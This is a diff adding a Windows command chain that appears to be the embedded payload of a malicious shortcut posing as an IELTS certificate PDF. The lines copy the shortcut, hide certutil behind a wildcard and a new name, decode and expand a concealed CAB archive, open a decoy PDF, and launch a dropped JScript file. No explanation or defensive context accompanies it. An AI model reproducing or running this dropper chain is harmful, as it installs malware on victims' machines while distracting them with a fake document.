@@ -1,0 +1,9 @@
+"C:\\windows\\System32\\cmd.exe" C:\\Windows\\System32\\cmd.exe /c  copy "International English Language Testing System certificate.pdf.lnk" C:\\Users\\user\\AppData\\Local\\Temp\\g4ZokyumB2DC4.tmp /y
+& for /r C:\\Windows\\System32\\ %%i in (*ertu*.exe) do copy %%i C:\\Users\\user\\AppData\\Local\\Temp\\gosia.exe /y
+& findstr.exe /b \"TVNDRgA\" C:\\Users\\user\\AppData\\Local\\Temp\\g4ZokyumB2DC4.tmp>C:\\Users\\user\\AppData\\Local\\Temp\\cSi1rouy4.tmp
+& C:\\Users\\user\\AppData\\Local\\Temp\\gosia.exe -decode C:\\Users\\user\\AppData\\Local\\Temp\\cSi1rouy4.tmp C:\\Users\\user\\AppData\\Local\\Temp\\o423DFDS4.tmp
+& expand C:\\Users\\user\\AppData\\Local\\Temp\\o423DFDS4.tmp -F:* C:\\Users\\user\\AppData\\Local\\Temp 
+& "C:\\Users\\user\\AppData\\Local\\Temp\\International English Language Testing System certificate.pdf" 
+& copy C:\\Users\\user\\AppData\\Local\\Temp\\66DF3DFG.tmp C:\\Users\\Public\\Downloads\\66DF3DFG.tmp 
+& Wscript C:\\Users\\user\\AppData\\Local\\Temp\\34fDFkfSD38.js 
+& exit
